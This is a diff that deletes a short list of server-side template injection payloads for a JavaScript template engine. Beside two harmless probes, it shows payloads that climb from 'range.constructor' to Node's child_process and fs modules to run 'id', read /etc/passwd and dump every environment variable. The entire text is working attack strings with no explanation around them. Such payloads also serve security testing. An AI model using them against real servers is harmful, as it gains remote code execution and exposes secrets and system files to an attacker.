@@ -1,6 +1,0 @@
-{{7*7}}
-{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
-{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()")()}}
-{% for i in range(0,10) %}{{i}}{% endfor %}
-{{range.constructor("return JSON.stringify(global.process.env)")()}}
-{{range.constructor("return global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')")()}}
